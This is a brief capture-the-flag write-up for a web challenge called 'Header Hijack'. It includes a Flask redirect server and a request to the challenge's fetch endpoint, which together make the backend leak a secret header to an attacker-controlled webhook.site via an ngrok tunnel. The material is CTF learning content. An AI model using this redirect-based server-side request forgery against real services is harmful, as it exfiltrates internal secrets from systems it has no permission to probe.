---
title: HAC CTF 2025 Header Hijack
draft: false
tags:
  - ctf
  - web-exploitation
---
# Header Hijack

> The gateway makes requests to an internal service that adds special headers to its responses. Your mission is to capture the secret header by setting up a redirect chain that exposes the header.

Not a full writeup, but basically:

```python
from flask import Flask, redirect, request, Response

app = Flask(__name__)

@app.route('/')
def redirect_to_internal():
    print(f"Received request from: {request.remote_addr}")
    
    # print headers
    print(request.headers)
    
    # print all headers, even non-standard ones
    print(request.__dict__)
    
    # The CTF server will follow this redirect internally
    # and request http://127.0.0.1:7777
    return redirect("https://webhook.site/c214ed42-846d-47dc-b0f5-a4a6c686efed", code=308)

if __name__ == '__main__':
    # Listen on all interfaces to be publicly accessible
    app.run(host='0.0.0.0', port=8000)
```

```python
BASE_URL = 'https://header-hijack.chals.ctf.malteksolutions.com/'

r = requests.post(BASE_URL + '/fetch', json = {
    'url': 'https://808e-2600-6c5d-6200-104c-54c-e05d-435d-4805.ngrok-free.app'
})
```

This will cause the backend to hit our ngrok (http/8000) and then redirect to a webhook.site. Checking out the webhook.site request, we see the secret header in the request headers. 